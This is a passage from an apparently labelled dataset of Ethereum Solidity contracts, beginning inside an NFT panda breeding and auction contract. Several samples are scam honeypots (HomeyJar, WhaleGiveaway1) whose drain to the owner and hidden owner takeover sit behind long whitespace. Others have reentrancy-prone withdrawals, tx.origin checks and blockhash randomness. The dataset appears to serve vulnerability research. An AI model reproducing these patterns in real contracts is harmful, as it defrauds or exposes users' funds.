         


         
         
        delete matron.siringWithId;



         
        pregnantPandas--;



         
          
        msg.sender.send(autoBirthFee);



        delete childOwner[_matronId];



         
        return kittenId;

    }

}











 
 
 
contract ClockAuctionBase {



     
    struct Auction {

         
        address seller;

         
        uint128 startingPrice;

         
        uint128 endingPrice;

         
        uint64 duration;

         
         
        uint64 startedAt;

         
        uint64 isGen0;

    }



     
    ERC721 public nonFungibleContract;



     
     
    uint256 public ownerCut;



     
    mapping (uint256 => Auction) tokenIdToAuction;



    event AuctionCreated(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration);

    event AuctionSuccessful(uint256 tokenId, uint256 totalPrice, address winner);

    event AuctionCancelled(uint256 tokenId);



     
     
     
    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {

        return (nonFungibleContract.ownerOf(_tokenId) == _claimant);

    }



     
     
     
     
    function _escrow(address _owner, uint256 _tokenId) internal {

         
        nonFungibleContract.transferFrom(_owner, this, _tokenId);

    }



     
     
     
     
    function _transfer(address _receiver, uint256 _tokenId) internal {

         
        nonFungibleContract.transfer(_receiver, _tokenId);

    }



     
     
     
     
    function _addAuction(uint256 _tokenId, Auction _auction) internal {

         
         
        require(_auction.duration >= 1 minutes);



        tokenIdToAuction[_tokenId] = _auction;



        AuctionCreated(

            uint256(_tokenId),

            uint256(_auction.startingPrice),

            uint256(_auction.endingPrice),

            uint256(_auction.duration)

        );

    } 



     
    function _cancelAuction(uint256 _tokenId, address _seller) internal {

        _removeAuction(_tokenId);

        _transfer(_seller, _tokenId);

        AuctionCancelled(_tokenId);

    }



     
     
    function _bid(uint256 _tokenId, uint256 _bidAmount)

        internal

        returns (uint256)

    {

         
        Auction storage auction = tokenIdToAuction[_tokenId];



         
         
         
         
        require(_isOnAuction(auction));



         
        uint256 price = _currentPrice(auction);

        require(_bidAmount >= price);



         
         
        address seller = auction.seller;



         
         
        _removeAuction(_tokenId);



         
        if (price > 0) {

             
             
             
            uint256 auctioneerCut = _computeCut(price);

            uint256 sellerProceeds = price - auctioneerCut;



             
             
             
             
             
             
             
             
            seller.transfer(sellerProceeds);

        }



         
         
         
         
        uint256 bidExcess = _bidAmount - price;



         
         
         
        msg.sender.transfer(bidExcess);



         
        AuctionSuccessful(_tokenId, price, msg.sender);



        return price;

    }







     
     
    function _removeAuction(uint256 _tokenId) internal {

        delete tokenIdToAuction[_tokenId];

    }



     
     
    function _isOnAuction(Auction storage _auction) internal view returns (bool) {

        return (_auction.startedAt > 0);

    }



     
     
     
     
    function _currentPrice(Auction storage _auction)

        internal

        view

        returns (uint256)

    {

        uint256 secondsPassed = 0;



         
         
         
        if (now > _auction.startedAt) {

            secondsPassed = now - _auction.startedAt;

        }



        return _computeCurrentPrice(

            _auction.startingPrice,

            _auction.endingPrice,

            _auction.duration,

            secondsPassed

        );

    }



     
     
     
     
    function _computeCurrentPrice(

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        uint256 _secondsPassed

    )

        internal

        pure

        returns (uint256)

    {

         
         
         
         
         
        if (_secondsPassed >= _duration) {

             
             
            return _endingPrice;

        } else {

             
             
            int256 totalPriceChange = int256(_endingPrice) - int256(_startingPrice);



             
             
             
            int256 currentPriceChange = totalPriceChange * int256(_secondsPassed) / int256(_duration);



             
             
            int256 currentPrice = int256(_startingPrice) + currentPriceChange;



            return uint256(currentPrice);

        }

    }



     
     
    function _computeCut(uint256 _price) internal view returns (uint256) {

         
         
         
         
         
        return _price * ownerCut / 10000;

    }



}









 

contract Pausable is Ownable {

  event Pause();

  event Unpause();



  bool public paused = false;





   

  modifier whenNotPaused() {

    require(!paused);

    _;

  }



   

  modifier whenPaused {

    require(paused);

    _;

  }



   

  function pause() onlyOwner whenNotPaused returns (bool) {

    paused = true;

    Pause();

    return true;

  }



   

  function unpause() onlyOwner whenPaused returns (bool) {

    paused = false;

    Unpause();

    return true;

  }

}





 
 
contract ClockAuction is Pausable, ClockAuctionBase {



     
     
     
    bytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);



     
     
     
     
     
     
    function ClockAuction(address _nftAddress, uint256 _cut) public {

        require(_cut <= 10000);

        ownerCut = _cut;



        ERC721 candidateContract = ERC721(_nftAddress);

        require(candidateContract.supportsInterface(InterfaceSignature_ERC721));

        nonFungibleContract = candidateContract;

    }



     
     
     
     
    function withdrawBalance() external {

        address nftAddress = address(nonFungibleContract);



        require(

            msg.sender == owner ||

            msg.sender == nftAddress

        );

         
         
        bool res = nftAddress.send(this.balance);

    }



     
     
     
     
     
     
     
    function createAuction(

        uint256 _tokenId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        address _seller

    )

        external

        whenNotPaused

    {

         
         
        require(_startingPrice == uint256(uint128(_startingPrice)));

        require(_endingPrice == uint256(uint128(_endingPrice)));

        require(_duration == uint256(uint64(_duration)));



        require(_owns(msg.sender, _tokenId));

        _escrow(msg.sender, _tokenId);

        Auction memory auction = Auction(

            _seller,

            uint128(_startingPrice),

            uint128(_endingPrice),

            uint64(_duration),

            uint64(now),

            0

        );

        _addAuction(_tokenId, auction);

    }



     
     
     
    function bid(uint256 _tokenId)

        external

        payable

        whenNotPaused

    {

         
        _bid(_tokenId, msg.value);

        _transfer(msg.sender, _tokenId);

    }



     
     
     
     
     
    function cancelAuction(uint256 _tokenId)

        external

    {

        Auction storage auction = tokenIdToAuction[_tokenId];

        require(_isOnAuction(auction));

        address seller = auction.seller;

        require(msg.sender == seller);

        _cancelAuction(_tokenId, seller);

    }



     
     
     
     
    function cancelAuctionWhenPaused(uint256 _tokenId)

        whenPaused

        onlyOwner

        external

    {

        Auction storage auction = tokenIdToAuction[_tokenId];

        require(_isOnAuction(auction));

        _cancelAuction(_tokenId, auction.seller);

    }



     
     
    function getAuction(uint256 _tokenId)

        external

        view

        returns

    (

        address seller,

        uint256 startingPrice,

        uint256 endingPrice,

        uint256 duration,

        uint256 startedAt

    ) {

        Auction storage auction = tokenIdToAuction[_tokenId];

        require(_isOnAuction(auction));

        return (

            auction.seller,

            auction.startingPrice,

            auction.endingPrice,

            auction.duration,

            auction.startedAt

        );

    }



     
     
    function getCurrentPrice(uint256 _tokenId)

        external

        view

        returns (uint256)

    {

        Auction storage auction = tokenIdToAuction[_tokenId];

        require(_isOnAuction(auction));

        return _currentPrice(auction);

    }



}









 
 
contract SiringClockAuction is ClockAuction {



     
     
    bool public isSiringClockAuction = true;



     
    function SiringClockAuction(address _nftAddr, uint256 _cut) public

        ClockAuction(_nftAddr, _cut) {}



     
     
     
     
     
     
     
    function createAuction(

        uint256 _tokenId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        address _seller

    )

        external

    {

         
         
        require(_startingPrice == uint256(uint128(_startingPrice)));

        require(_endingPrice == uint256(uint128(_endingPrice)));

        require(_duration == uint256(uint64(_duration)));



        require(msg.sender == address(nonFungibleContract));

        _escrow(_seller, _tokenId);

        Auction memory auction = Auction(

            _seller,

            uint128(_startingPrice),

            uint128(_endingPrice),

            uint64(_duration),

            uint64(now),

            0

        );

        _addAuction(_tokenId, auction);

    }



     
     
     
     
    function bid(uint256 _tokenId)

        external

        payable

    {

        require(msg.sender == address(nonFungibleContract));

        address seller = tokenIdToAuction[_tokenId].seller;

         
        _bid(_tokenId, msg.value);

         
         
        _transfer(seller, _tokenId);

    }



}









 
 
contract SaleClockAuction is ClockAuction {



     
     
    bool public isSaleClockAuction = true;



     
    uint256 public gen0SaleCount;

    uint256[5] public lastGen0SalePrices;

    uint256 public constant SurpriseValue = 10 finney;



    uint256[] CommonPanda;

    uint256[] RarePanda;

    uint256   CommonPandaIndex;

    uint256   RarePandaIndex;



     
    function SaleClockAuction(address _nftAddr, uint256 _cut) public

        ClockAuction(_nftAddr, _cut) {

            CommonPandaIndex = 1;

            RarePandaIndex   = 1;

    }



     
     
     
     
     
     
    function createAuction(

        uint256 _tokenId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        address _seller

    )

        external

    {

         
         
        require(_startingPrice == uint256(uint128(_startingPrice)));

        require(_endingPrice == uint256(uint128(_endingPrice)));

        require(_duration == uint256(uint64(_duration)));



        require(msg.sender == address(nonFungibleContract));

        _escrow(_seller, _tokenId);

        Auction memory auction = Auction(

            _seller,

            uint128(_startingPrice),

            uint128(_endingPrice),

            uint64(_duration),

            uint64(now),

            0

        );

        _addAuction(_tokenId, auction);

    }



    function createGen0Auction(

        uint256 _tokenId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        address _seller

    )

        external

    {

         
         
        require(_startingPrice == uint256(uint128(_startingPrice)));

        require(_endingPrice == uint256(uint128(_endingPrice)));

        require(_duration == uint256(uint64(_duration)));



        require(msg.sender == address(nonFungibleContract));

        _escrow(_seller, _tokenId);

        Auction memory auction = Auction(

            _seller,

            uint128(_startingPrice),

            uint128(_endingPrice),

            uint64(_duration),

            uint64(now),

            1

        );

        _addAuction(_tokenId, auction);

    }    



     
     
    function bid(uint256 _tokenId)

        external

        payable

    {

         
        uint64 isGen0 = tokenIdToAuction[_tokenId].isGen0;

        uint256 price = _bid(_tokenId, msg.value);

        _transfer(msg.sender, _tokenId);



         
        if (isGen0 == 1) {

             
            lastGen0SalePrices[gen0SaleCount % 5] = price;

            gen0SaleCount++;

        }

    }



    function createPanda(uint256 _tokenId,uint256 _type)

        external

    {

        require(msg.sender == address(nonFungibleContract));

        if (_type == 0) {

            CommonPanda.push(_tokenId);

        }else {

            RarePanda.push(_tokenId);

        }

    }



    function surprisePanda()

        external

        payable

    {

        bytes32 bHash = keccak256(block.blockhash(block.number),block.blockhash(block.number-1));

        uint256 PandaIndex;

        if (bHash[25] > 0xC8) {

            require(uint256(RarePanda.length) >= RarePandaIndex);

            PandaIndex = RarePandaIndex;

            RarePandaIndex ++;



        } else{

            require(uint256(CommonPanda.length) >= CommonPandaIndex);

            PandaIndex = CommonPandaIndex;

            CommonPandaIndex ++;

        }

        _transfer(msg.sender,PandaIndex);

    }



    function packageCount() external view returns(uint256 common,uint256 surprise) {

        common   = CommonPanda.length + 1 - CommonPandaIndex;

        surprise = RarePanda.length + 1 - RarePandaIndex;

    }



    function averageGen0SalePrice() external view returns (uint256) {

        uint256 sum = 0;

        for (uint256 i = 0; i < 5; i++) {

            sum += lastGen0SalePrices[i];

        }

        return sum / 5;

    }



}







 
 
contract SaleClockAuctionERC20 is ClockAuction {





    event AuctionERC20Created(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration, address erc20Contract);



     
     
    bool public isSaleClockAuctionERC20 = true;



    mapping (uint256 => address) public tokenIdToErc20Address;



    mapping (address => uint256) public erc20ContractsSwitcher;



    mapping (address => uint256) public balances;

    

     
    function SaleClockAuctionERC20(address _nftAddr, uint256 _cut) public

        ClockAuction(_nftAddr, _cut) {}



    function erc20ContractSwitch(address _erc20address, uint256 _onoff) external{

        require (msg.sender == address(nonFungibleContract));



        require (_erc20address != address(0));



        erc20ContractsSwitcher[_erc20address] = _onoff;

    }

     
     
     
     
     
     
    function createAuction(

        uint256 _tokenId,

        address _erc20Address,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration,

        address _seller

    )

        external

    {

         
         
        require(_startingPrice == uint256(uint128(_startingPrice)));

        require(_endingPrice == uint256(uint128(_endingPrice)));

        require(_duration == uint256(uint64(_duration)));



        require(msg.sender == address(nonFungibleContract));



        require (erc20ContractsSwitcher[_erc20Address] > 0);

        

        _escrow(_seller, _tokenId);

        Auction memory auction = Auction(

            _seller,

            uint128(_startingPrice),

            uint128(_endingPrice),

            uint64(_duration),

            uint64(now),

            0

        );

        _addAuctionERC20(_tokenId, auction, _erc20Address);

        tokenIdToErc20Address[_tokenId] = _erc20Address;

    }



     
     
     
     
    function _addAuctionERC20(uint256 _tokenId, Auction _auction, address _erc20address) internal {

         
         
        require(_auction.duration >= 1 minutes);



        tokenIdToAuction[_tokenId] = _auction;



        AuctionERC20Created(

            uint256(_tokenId),

            uint256(_auction.startingPrice),

            uint256(_auction.endingPrice),

            uint256(_auction.duration),

            _erc20address

        );

    }   



    function bid(uint256 _tokenId)

        external

        payable{

             
    }



     
     
    function bidERC20(uint256 _tokenId,uint256 _amount)

        external

    {

         
        address seller = tokenIdToAuction[_tokenId].seller;

        address _erc20address = tokenIdToErc20Address[_tokenId];

        require (_erc20address != address(0));

        uint256 price = _bidERC20(_erc20address,msg.sender,_tokenId, _amount);

        _transfer(msg.sender, _tokenId);

        delete tokenIdToErc20Address[_tokenId];

    }



    function cancelAuction(uint256 _tokenId)

        external

    {

        Auction storage auction = tokenIdToAuction[_tokenId];

        require(_isOnAuction(auction));

        address seller = auction.seller;

        require(msg.sender == seller);

        _cancelAuction(_tokenId, seller);

        delete tokenIdToErc20Address[_tokenId];

    }



    function withdrawERC20Balance(address _erc20Address, address _to) external returns(bool res)  {

        require (balances[_erc20Address] > 0);

        require(msg.sender == address(nonFungibleContract));

        ERC20(_erc20Address).transfer(_to, balances[_erc20Address]);

    }

    

     
     
    function _bidERC20(address _erc20Address,address _buyerAddress, uint256 _tokenId, uint256 _bidAmount)

        internal

        returns (uint256)

    {

         
        Auction storage auction = tokenIdToAuction[_tokenId];



         
         
         
         
        require(_isOnAuction(auction));





        require (_erc20Address != address(0) && _erc20Address == tokenIdToErc20Address[_tokenId]);

        



         
        uint256 price = _currentPrice(auction);

        require(_bidAmount >= price);



         
         
        address seller = auction.seller;



         
         
        _removeAuction(_tokenId);



         
        if (price > 0) {

             
             
             
            uint256 auctioneerCut = _computeCut(price);

            uint256 sellerProceeds = price - auctioneerCut;



             
             
            require(ERC20(_erc20Address).transferFrom(_buyerAddress,seller,sellerProceeds));

            if (auctioneerCut > 0){

                require(ERC20(_erc20Address).transferFrom(_buyerAddress,address(this),auctioneerCut));

                balances[_erc20Address] += auctioneerCut;

            }

        }



         
        AuctionSuccessful(_tokenId, price, msg.sender);



        return price;

    }

}





 
 
 
contract PandaAuction is PandaBreeding {



     
     
     
     


     
     
    function setSaleAuctionAddress(address _address) external onlyCEO {

        SaleClockAuction candidateContract = SaleClockAuction(_address);



         
        require(candidateContract.isSaleClockAuction());



         
        saleAuction = candidateContract;

    }



    function setSaleAuctionERC20Address(address _address) external onlyCEO {

        SaleClockAuctionERC20 candidateContract = SaleClockAuctionERC20(_address);



         
        require(candidateContract.isSaleClockAuctionERC20());



         
        saleAuctionERC20 = candidateContract;

    }



     
     
    function setSiringAuctionAddress(address _address) external onlyCEO {

        SiringClockAuction candidateContract = SiringClockAuction(_address);



         
        require(candidateContract.isSiringClockAuction());



         
        siringAuction = candidateContract;

    }



     
     
    function createSaleAuction(

        uint256 _pandaId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration

    )

        external

        whenNotPaused

    {

         
         
         
        require(_owns(msg.sender, _pandaId));

         
         
         
        require(!isPregnant(_pandaId));

        _approve(_pandaId, saleAuction);

         
         
        saleAuction.createAuction(

            _pandaId,

            _startingPrice,

            _endingPrice,

            _duration,

            msg.sender

        );

    }



     
     
    function createSaleAuctionERC20(

        uint256 _pandaId,

        address _erc20address,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration

    )

        external

        whenNotPaused

    {

         
         
         
        require(_owns(msg.sender, _pandaId));

         
         
         
        require(!isPregnant(_pandaId));

        _approve(_pandaId, saleAuctionERC20);

         
         
        saleAuctionERC20.createAuction(

            _pandaId,

            _erc20address,

            _startingPrice,

            _endingPrice,

            _duration,

            msg.sender

        );

    }



    function switchSaleAuctionERC20For(address _erc20address, uint256 _onoff) external onlyCOO{

        saleAuctionERC20.erc20ContractSwitch(_erc20address,_onoff);

    }





     
     
     
    function createSiringAuction(

        uint256 _pandaId,

        uint256 _startingPrice,

        uint256 _endingPrice,

        uint256 _duration

    )

        external

        whenNotPaused

    {

         
         
         
        require(_owns(msg.sender, _pandaId));

        require(isReadyToBreed(_pandaId));

        _approve(_pandaId, siringAuction);

         
         
        siringAuction.createAuction(

            _pandaId,

            _startingPrice,

            _endingPrice,

            _duration,

            msg.sender

        );

    }



     
     
     
     
    function bidOnSiringAuction(

        uint256 _sireId,

        uint256 _matronId

    )

        external

        payable

        whenNotPaused

    {

         
        require(_owns(msg.sender, _matronId));

        require(isReadyToBreed(_matronId));

        require(_canBreedWithViaAuction(_matronId, _sireId));



         
        uint256 currentPrice = siringAuction.getCurrentPrice(_sireId);

        require(msg.value >= currentPrice + autoBirthFee);



         
        siringAuction.bid.value(msg.value - autoBirthFee)(_sireId);

        _breedWith(uint32(_matronId), uint32(_sireId), msg.sender);

    }



     
     
     
    function withdrawAuctionBalances() external onlyCLevel {

        saleAuction.withdrawBalance();

        siringAuction.withdrawBalance();

    }





    function withdrawERC20Balance(address _erc20Address, address _to) external onlyCLevel {

        require(saleAuctionERC20 != address(0));

        saleAuctionERC20.withdrawERC20Balance(_erc20Address,_to);

    }    

}











 
contract PandaMinting is PandaAuction {



     
     
    uint256 public constant GEN0_CREATION_LIMIT = 45000;





     
    uint256 public constant GEN0_STARTING_PRICE = 100 finney;

    uint256 public constant GEN0_AUCTION_DURATION = 1 days;

    uint256 public constant OPEN_PACKAGE_PRICE = 10 finney;





     
     




     
     
     
    function createWizzPanda(uint256[2] _genes, uint256 _generation, address _owner) external onlyCOO {

        address pandaOwner = _owner;

        if (pandaOwner == address(0)) {

            pandaOwner = cooAddress;

        }



        _createPanda(0, 0, _generation, _genes, pandaOwner);

    }



     
     
     
    function createPanda(uint256[2] _genes,uint256 _generation,uint256 _type)

        external

        payable

        onlyCOO

        whenNotPaused

    {

        require(msg.value >= OPEN_PACKAGE_PRICE);

        uint256 kittenId = _createPanda(0, 0, _generation, _genes, saleAuction);

        saleAuction.createPanda(kittenId,_type);

    }



     
     
     
     
     
     


     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     


    function createGen0Auction(uint256 _pandaId) external onlyCOO {

        require(_owns(msg.sender, _pandaId));

         


        _approve(_pandaId, saleAuction);



        saleAuction.createGen0Auction(

            _pandaId,

            _computeNextGen0Price(),

            0,

            GEN0_AUCTION_DURATION,

            msg.sender

        );

    }



     
     
    function _computeNextGen0Price() internal view returns(uint256) {

        uint256 avePrice = saleAuction.averageGen0SalePrice();



         
        require(avePrice == uint256(uint128(avePrice)));



        uint256 nextPrice = avePrice + (avePrice / 2);



         
        if (nextPrice < GEN0_STARTING_PRICE) {

            nextPrice = GEN0_STARTING_PRICE;

        }



        return nextPrice;

    }

}







 
 
 
contract PandaCore is PandaMinting {



     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     


     
    address public newContractAddress;





     
    function PandaCore() public {

         
        paused = true;



         
        ceoAddress = msg.sender;



         
        cooAddress = msg.sender;



         
         


         


         
    }



     
    function init() external onlyCEO whenPaused {

         
        require(pandas.length == 0);

         
        uint256[2] memory _genes = [uint256(-1),uint256(-1)];



        wizzPandaQuota[1] = 100;

       _createPanda(0, 0, 0, _genes, address(0));

    }



     
     
     
     
     
     
    function setNewAddress(address _v2Address) external onlyCEO whenPaused {

         
        newContractAddress = _v2Address;

        ContractUpgrade(_v2Address);

    }

    



     
     
     
    function() external payable {

        require(

            msg.sender == address(saleAuction) ||

            msg.sender == address(siringAuction)

        );

    }



     
     
    function getPanda(uint256 _id)

        external

        view

        returns (

        bool isGestating,

        bool isReady,

        uint256 cooldownIndex,

        uint256 nextActionAt,

        uint256 siringWithId,

        uint256 birthTime,

        uint256 matronId,

        uint256 sireId,

        uint256 generation,

        uint256[2] genes

    ) {

        Panda storage kit = pandas[_id];



         
        isGestating = (kit.siringWithId != 0);

        isReady = (kit.cooldownEndBlock <= block.number);

        cooldownIndex = uint256(kit.cooldownIndex);

        nextActionAt = uint256(kit.cooldownEndBlock);

        siringWithId = uint256(kit.siringWithId);

        birthTime = uint256(kit.birthTime);

        matronId = uint256(kit.matronId);

        sireId = uint256(kit.sireId);

        generation = uint256(kit.generation);

        genes = kit.genes;

    }



     
     
     
     
     
    function unpause() public onlyCEO whenPaused {

        require(saleAuction != address(0));

        require(siringAuction != address(0));

        require(geneScience != address(0));

        require(newContractAddress == address(0));



         
        super.unpause();

    }



     
    function withdrawBalance() external onlyCFO {

        uint256 balance = this.balance;

         
        uint256 subtractFees = (pregnantPandas + 1) * autoBirthFee;



        if (balance > subtractFees) {

              
            cfoAddress.send(balance - subtractFees);

        }

    }

}",0000100100010000000110000
10033,0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4,"

pragma solidity ^0.4.19;



contract HomeyJar {

    address public Owner = msg.sender;

   

    function() public payable {}

   

    function GetHoneyFromJar() public payable {                                              

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data) payable public {

        require(msg.sender == Owner);

          
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10034,0x7541b76cb60f4c60af330c208b0623b7f54bf615," 



pragma solidity ^0.4.25;



contract U_BANK

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 2 ether;    



    function U_BANK(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10035,0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37,"

pragma solidity ^0.4.19;



contract WhaleGiveaway1

{

    address public Owner = msg.sender;

    uint constant public minEligibility = 0.999001 ether; 

   

    function()

    public

    payable

    {

        

    }

   

    function redeem()

    public

    payable

    {                                                                    

        if(msg.value>=minEligibility)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10036,0x7a4349a749e59a5736efb7826ee3496a2dfd5489,"

pragma solidity ^0.4.19;



contract WhaleGiveaway1

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function GetFreebie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10037,0x7a8721a9d64c74da899424c1b52acbf58ddc9782,"

pragma solidity ^0.4.19;



contract PrivateDeposit

{

    mapping (address => uint) public balances;

        

    uint public MinDeposit = 1 ether;

    address public owner;

    

    Log TransferLog;

    

    modifier onlyOwner() {

        require(tx.origin == owner);

        _;

    }    

    

    function PrivateDeposit()

    {

        owner = msg.sender;

        TransferLog = new Log();

    }

    

    

    

    function setLog(address _lib) onlyOwner

    {

        TransferLog = Log(_lib);

    }    

    

    function Deposit()

    public

    payable

    {

        if(msg.value >= MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    {

        if(_am<=balances[msg.sender])

        {            

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001010000000000000000100
10038,0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3,"

pragma solidity ^0.4.25;



contract W_WALLET

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function W_WALLET(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

